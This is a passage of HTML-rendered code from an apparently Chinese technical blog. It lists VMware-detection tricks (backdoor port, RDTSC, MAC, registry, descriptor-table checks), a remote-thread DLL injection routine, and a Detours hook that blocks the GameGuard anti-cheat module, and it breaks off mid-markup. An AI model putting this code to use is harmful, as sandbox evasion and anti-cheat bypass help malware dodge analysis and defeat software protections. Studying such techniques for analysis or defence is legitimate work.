class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">虚拟机后门检测（IN）</span><br><span class=\"line\"></span><br><span class=\"line\">__try</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpush   edx</span><br><span class=\"line\">\t\tpush   ecx</span><br><span class=\"line\">\t\tpush   ebx</span><br><span class=\"line\">\t\tmov    eax, &#x27;VMXh&#x27;</span><br><span class=\"line\">\t\tmov    ebx, 0  // 将ebx设置为非幻数’VMXH’的其它值</span><br><span class=\"line\">\t\tmov    ecx, 10 // 指定功能号，用于获取VMWare版本，当它为x14时用于获取VMware内存大小</span><br><span class=\"line\">\t\tmov    edx, &#x27;VX&#x27; // 端口号</span><br><span class=\"line\">\t\tin     eax, dx // 从端口dx读取VMware版本到eax</span><br><span class=\"line\">\t\t//若上面指定功能号为x14时，可通过判断eax中的值是否大于，若是则说明处于虚拟机中</span><br><span class=\"line\">\t\tcmp    ebx, &#x27;VMXh&#x27; // 判断ebx中是否包含VMware版本’VMXh’，若是则在虚拟机中</span><br><span class=\"line\">\t\tsetz   [rc] // 设置返回值</span><br><span class=\"line\">\t\tpop    ebx</span><br><span class=\"line\">\t\tpop    ecx</span><br><span class=\"line\">\t\tpop    edx</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\trc = true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">__except(EXCEPTION_EXECUTE_HANDLER)  //如果未处于VMware中，则触发此异常</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\trc = false;</span><br><span class=\"line\">&#125;    虚拟机中IN读取指定端口不会异常，如果异常了为真实机。</span><br><span class=\"line\"></span><br><span class=\"line\">///////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">时间戳指令检测</span><br><span class=\"line\"></span><br><span class=\"line\">__asm</span><br><span class=\"line\"> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tRDTSC</span><br><span class=\"line\">\t\tmov ifirst,eax</span><br><span class=\"line\">\t\tRDTSC</span><br><span class=\"line\">\t\tmov isecond,eax</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tisub = isecond - ifirst;</span><br><span class=\"line\">\tif (isub &gt; 0x0ff)   //判断两次之差是否大于0xff</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">MAC地址检测</span><br><span class=\"line\"></span><br><span class=\"line\">虚拟机中MAC地址的头两个字节是000c或者0005</span><br><span class=\"line\">ULONG\tuInfo = GetAdaptersInfo(pAdapterInfo, &amp;ulOutBufLen);</span><br><span class=\"line\">\tpMac01 = (BYTE)pAdapterInfo-&gt;Address[0];</span><br><span class=\"line\">\tpMac02 = (BYTE)pAdapterInfo-&gt;Address[1];</span><br><span class=\"line\"> </span><br><span class=\"line\">\tif (pMac01 == 0x00 &amp;&amp; (pMac02 == 0x0c || pMac02 == 0x05) )</span><br><span class=\"line\">\t    MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t    MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">进程检测</span><br><span class=\"line\">vmtoolsd.exe，vmtoolsd.exe，VMwareTray.exe，vmacthlp.exe，VMUpgradeHelper.exe虚拟机中存在的进程。</span><br><span class=\"line\">枚举方式可以有多种：</span><br><span class=\"line\">1.创建进程快照（CreateToolhelp32Snapshot）</span><br><span class=\"line\">2. 枚举进程和枚举进程模块，</span><br><span class=\"line\">EnumProcesses和EnumProcessModules</span><br><span class=\"line\">3.通过WMI接口查询进程。</span><br><span class=\"line\"> </span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">文件检测</span><br><span class=\"line\"></span><br><span class=\"line\">通过打开虚拟机相关的文件进行判断</span><br><span class=\"line\">例如：</span><br><span class=\"line\">C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd.exe</span><br><span class=\"line\"></span><br><span class=\"line\">    char  *szFile = &quot;C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd.exe&quot;;</span><br><span class=\"line\">    HANDLE hVmFile = CreateFileA(szFile, GENERIC_READ|GENERIC_WRITE,     FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);</span><br><span class=\"line\">    if (hVmFile != INVALID_HANDLE_VALUE)</span><br><span class=\"line\">        MessageBox(L&quot;In VM&quot;,L&quot;Check VM&quot;,MB_OK);    </span><br><span class=\"line\">    else</span><br><span class=\"line\">        MessageBox(L&quot;Not In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    CloseHandle(hVmFile);</span><br><span class=\"line\"></span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">注册表检测</span><br><span class=\"line\">注册表里对应的虚拟机的信息非常多，由此可以操作判断虚拟机。</span><br><span class=\"line\">HKEY hKey = NULL;</span><br><span class=\"line\">WCHAR * szSubKey = L&quot;SOFTWARE\\\\VMware, Inc.\\\\VMware Tools&quot;;</span><br><span class=\"line\">ULONG uReg=RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey ,0,KEY_READ,&amp;hKey);</span><br><span class=\"line\">if (uReg == ERROR_SUCCESS)</span><br><span class=\"line\">     MessageBox(L&quot;In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">else</span><br><span class=\"line\">     MessageBox(L&quot;Not In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">RegCloseKey(hKey);</span><br><span class=\"line\"></span><br><span class=\"line\">磁盘型号Model Number</span><br><span class=\"line\">Disk Serial Number : &quot;WD-WMA9N2077672“</span><br><span class=\"line\">Disk Model Number : &quot;WDC WD80EB-28CGH1 “</span><br><span class=\"line\">Disk Serial Numbe : 硬盘序列号</span><br><span class=\"line\">Disk Model Number : 硬盘型号</span><br><span class=\"line\">我本机的Model Number是：ST350041CC66</span><br><span class=\"line\">虚拟机中的Model Number:VMware,VMware Virtual S1.0</span><br><span class=\"line\"></span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">显示卡检测</span><br><span class=\"line\">虚拟机的显示卡名称是VMware SVGA II</span><br><span class=\"line\"> if (EnumDisplayDevices(NULL, nDeviceIndex, &amp;DispDev, 0)) </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        hr = StringCchCopy((STRSAFE_LPWSTR)lpszMonitorInfo, 0x100, (STRSAFE_LPWSTR)DispDev.DeviceString);</span><br><span class=\"line\">        if (FAILED(hr))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">               return FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        bRet = FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\"></span><br><span class=\"line\">系统设备检测</span><br><span class=\"line\">虚拟机中存在通讯接口设备和磁盘设备</span><br><span class=\"line\">VMware VMCI Bus Device</span><br><span class=\"line\">VMware, VMware Virtual S SCSI Disk Device</span><br><span class=\"line\">通过枚举系统所有设备信息</span><br><span class=\"line\">如果发现VMCI Device或者DISK Device就是在虚拟机中了</span><br><span class=\"line\"></span><br><span class=\"line\">IDT基址检测</span><br><span class=\"line\">typedef struct</span><br><span class=\"line\"> &#123;undefined</span><br><span class=\"line\">WORD IDTLimit; // IDT的大小</span><br><span class=\"line\">WORD LowIDTbase; // IDT的低位地址</span><br><span class=\"line\">WORD HiIDTbase; // IDT的高位地址 </span><br><span class=\"line\">&#125; IDTINFO;  </span><br><span class=\"line\">Redpill作者(？不是bulepill么)在VMware上发现虚拟机系统上的IDT地址通常位于0xFFXXXXXX，而Virtual PC通常位于0xE8XXXXXX，而在真实主机上位于0x80xxxxxx。Redpill仅仅是通过判断执行SIDT指令后返回的第一字节是否大于0xD0，若是则说明它处于虚拟机，否则处于真实主机中。</span><br><span class=\"line\"></span><br><span class=\"line\">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\"></span><br><span class=\"line\">LDT和GDT基址检测</span><br><span class=\"line\">在保护模式下，所有的内存访问都要通过全局描述符表（GDT）或者本地描述符表（LDT）才能进行。这些表包含有段描述符的调用入口。各个段描述符都包含有各段的基址，访问权限，类型和使用信息，而且每个段描述符都拥有一个与之相匹配的段选择子，各个段选择子都为软件程序提供一个GDT或LDT索引（与之相关联的段描述符偏移量），一个全局/本地标志（决定段选择子是指向GDT还是LDT），以及访问权限信息。 若想访问段中的某一字节，必须同时提供一个段选择子和一个偏移量。段选择子（寄存器）为段提供可访问的段描述符地址（在GDT 或者LDT 中）。 GDT的线性基址被保存在GDT寄存器（GDTR）中，而LDT的线性基址被保存在LDT寄存器（LDTR）中。</span><br><span class=\"line\"></span><br><span class=\"line\">当LDT基址位于0x0000（只有两字节）时为真实主机，否则为虚拟    机，而当GDT基址位于0xFFXXXXXX时说明处于虚拟机中，否则为真实主机    </span><br><span class=\"line\">           unsigned short ldt_addr = 0;</span><br><span class=\"line\">    unsigned char ldtr[2] = &#123;0&#125;;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        sldt ldtr</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        ldt_addr = *((unsigned short *)&amp;ldtr);</span><br><span class=\"line\">    if(ldt_addr != 0x0000)</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">GDT基址位于0xFFXXXXXX处于虚拟机中，真实机在x80XXXXXX</span><br><span class=\"line\">    unsigned int gdt_addr = 0;</span><br><span class=\"line\">    unsigned char gdtr[4];</span><br><span class=\"line\"></span><br><span class=\"line\">    _asm sgdt gdtr</span><br><span class=\"line\">        gdt_addr = *((unsigned int *)&amp;gdtr[2]);</span><br><span class=\"line\">    printf(&quot;GDT BaseAddr:0x%x\\n&quot;, gdt_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    if((gdt_addr &gt;&gt; 24) == 0xff)</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">///////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class=\"line\">STR检测</span><br><span class=\"line\">在保护模式下运行的所有程序在切换任务时，对于当前任务中指向TSS的段选择器将会被存储在任务寄存器中，TSS中包含有当前任务的可执行环境状态，包括各种寄存器状态等等，当任务再次被执行时，处理器就会保存原先的任务状态。每项任务均有其自己的TSS，而我们可以通过STR指令来获取指向当前任务中TSS的段选择器。这里STR（Store task register）指令是用于将任务寄存器 (TR) 中的段选择器存储到目标操作数，目标操作数可以是通用寄存器或内存位置，使用此指令存储的段选择器指向当前正在运行的任务的任务状态段 (TSS)。在虚拟机和真实主机之中，通过STR读取的地址是不同的，当地址等于0x0040xxxx时，说明处于虚拟机中，否则为真实主机。</span><br><span class=\"line\"></span><br><span class=\"line\">Str将任务寄存器(TR) 中的段选择器存储到目标操作数</span><br><span class=\"line\">    当地址等于x0040xxxx时，说明处于虚拟机中，否则为真实机</span><br><span class=\"line\">    unsigned char mem[2] = &#123;0&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    __asm str mem;</span><br><span class=\"line\">    if ( (mem[0]==0x00) &amp;&amp; (mem[1]==0x40))</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;undefined</span><br><span class=\"line\">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">///////////////////////////////////定义远程线程////////////////////////////////////////////</span><br><span class=\"line\">static VOID WINAPI RemoteThread(LPVOID lpParam)</span><br><span class=\"line\">&#123;       </span><br><span class=\"line\">        PINJECTDATA myData=(PINJECTDATA)lpParam;</span><br><span class=\"line\">        DWORD       dwGetModuleHandleA,</span><br><span class=\"line\">                        dwLoadLibraryA,</span><br><span class=\"line\">                                dwFreeLibrary,</span><br><span class=\"line\">                                dwGetProcAddress,</span><br><span class=\"line\">                    hKernel32;</span><br><span class=\"line\"></span><br><span class=\"line\">        dwGetModuleHandleA= (DWORD)myData-&gt;_GetModuleHandleA;</span><br><span class=\"line\">        dwLoadLibraryA    = (DWORD)myData-&gt;_LoadLibraryA;</span><br><span class=\"line\">        dwFreeLibrary     = (DWORD)myData-&gt;_FreeLibrary;</span><br><span class=\"line\">        dwGetProcAddress  = (DWORD)myData-&gt;_GetProcAddress;</span><br><span class=\"line\">        hKernel32         =        myData-&gt;hKernel32;</span><br><span class=\"line\"></span><br><span class=\"line\">    ///////////////////////下面的汇编代码是根据输出函数地址表找到相应的函数地址的RVA值////////////</span><br><span class=\"line\">         _asm&#123;               </span><br><span class=\"line\">                mov  ebx,hKernel32            // &lt;--- 这个是kernel32.dll的句柄,NP直接硬编码到这里</span><br><span class=\"line\"></span><br><span class=\"line\">                mov  eax,dwGetModuleHandleA</span><br><span class=\"line\">                mov  edx,[eax]                // &lt;--- 根据地址表找出相应函数的RVA值</span><br><span class=\"line\">                add  edx,ebx                  // &lt;--- 函数地址=模块加载基地址(即handle)+相应RVA值</span><br><span class=\"line\">                mov  dwGetModuleHandleA,edx  </span><br><span class=\"line\"></span><br><span class=\"line\">                mov  eax,dwLoadLibraryA</span><br><span class=\"line\">                mov  edx,[eax]</span><br><span class=\"line\">                add  edx,ebx</span><br><span class=\"line\">                mov  dwLoadLibraryA,edx</span><br><span class=\"line\"></span><br><span class=\"line\">                mov  eax,dwFreeLibrary</span><br><span class=\"line\">                mov  edx,[eax]</span><br><span class=\"line\">                add  edx,ebx</span><br><span class=\"line\">                mov  dwFreeLibrary,edx</span><br><span class=\"line\"></span><br><span class=\"line\">                mov  eax,dwGetProcAddress</span><br><span class=\"line\">                mov  edx,[eax]</span><br><span class=\"line\">                add  edx,ebx</span><br><span class=\"line\">                mov  dwGetProcAddress,edx</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         ///////////////////////////////////////////////////////////////////</span><br><span class=\"line\"></span><br><span class=\"line\">    myData-&gt;_GetModuleHandleA= (GETMODULEHANDLEA)dwGetModuleHandleA;</span><br><span class=\"line\">    myData-&gt;_LoadLibraryA    = (LOADLIBRARYA)    dwLoadLibraryA;</span><br><span class=\"line\">    myData-&gt;_FreeLibrary     = (FREELIBRARY)     dwFreeLibrary;</span><br><span class=\"line\">    myData-&gt;_GetProcAddress  = (GETPROCADDRESS)  dwGetProcAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    myData-&gt;_LoadLibraryA(myData-&gt;szLibraryPath); // 加载DLL</span><br><span class=\"line\">        ////////////////////////////////////////////////////</span><br><span class=\"line\">        //你可以在这里添加其他代码</span><br><span class=\"line\">        //////////////////////////////////////////////////</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">**********************************************************************************************************</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMODULE WINAPI MyLoadLibraryA(</span><br><span class=\"line\">\t\t\t __in LPCSTR lpLibFileName</span><br><span class=\"line\">\t\t\t )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (strstr(lpLibFileName,&quot;npggNT.des&quot;)!=NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMessageBoxA(NULL,&quot;kill npggNT.des 注入&quot;,NULL,0);</span><br><span class=\"line\">\t\treturn NULL;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn fnLoadLibraryA(lpLibFileName);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CAntiGGHookDlg::CAntiGGHookDlg(CWnd* pParent /*=NULL*/)</span><br><span class=\"line\">\t: CDialog(CAntiGGHookDlg::IDD, pParent)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CAntiGGHookDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::DoDataExchange(pDX);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BEGIN_MESSAGE_MAP(CAntiGGHookDlg, CDialog)</span><br><span class=\"line\">\tON_WM_SYSCOMMAND()</span><br><span class=\"line\">\tON_WM_PAINT()</span><br><span class=\"line\">\tON_WM_QUERYDRAGICON()</span><br><span class=\"line\">\t//&#125;&#125;AFX_MSG_MAP</span><br><span class=\"line\">\tON_BN_CLICKED(IDOK, &amp;CAntiGGHookDlg::OnBnClickedOk)</span><br><span class=\"line\">END_MESSAGE_MAP()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// CAntiGGHookDlg 消息处理程序</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CAntiGGHookDlg::OnInitDialog()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::OnInitDialog();</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 将“关于...”菜单项添加到系统菜单中。</span><br><span class=\"line\"></span><br><span class=\"line\">\t// IDM_ABOUTBOX 必须在系统命令范围内。</span><br><span class=\"line\">\tASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX);</span><br><span class=\"line\">\tASSERT(IDM_ABOUTBOX &lt; 0xF000);</span><br><span class=\"line\"></span><br><span class=\"line\">\tCMenu* pSysMenu = GetSystemMenu(FALSE);</span><br><span class=\"line\">\tif (pSysMenu != NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCString strAboutMenu;</span><br><span class=\"line\">\t\tstrAboutMenu.LoadString(IDS_ABOUTBOX);</span><br><span class=\"line\">\t\tif (!strAboutMenu.IsEmpty())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_SEPARATOR);</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span><br><span class=\"line\">\t//  执行此操作</span><br><span class=\"line\">\tSetIcon(m_hIcon, TRUE);\t\t\t// 设置大图标</span><br><span class=\"line\">\tSetIcon(m_hIcon, FALSE);\t\t// 设置小图标</span><br><span class=\"line\"></span><br><span class=\"line\">\t// TODO: 在此添加额外的初始化代码</span><br><span class=\"line\">\tHMODULE dllhandle = NULL;</span><br><span class=\"line\">\tif (GetModuleHandleA(&quot;kernel32.dll&quot;) != NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdllhandle = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdllhandle = LoadLibraryA(&quot;kernel32.dll&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDetourTransactionBegin();</span><br><span class=\"line\">\tDetourUpdateThread(GetCurrentThread());</span><br><span class=\"line\"></span><br><span class=\"line\">\tfnLoadLibraryA = (lpfunLoadLibraryA)GetProcAddress(dllhandle, &quot;LoadLibraryA&quot;);</span><br><span 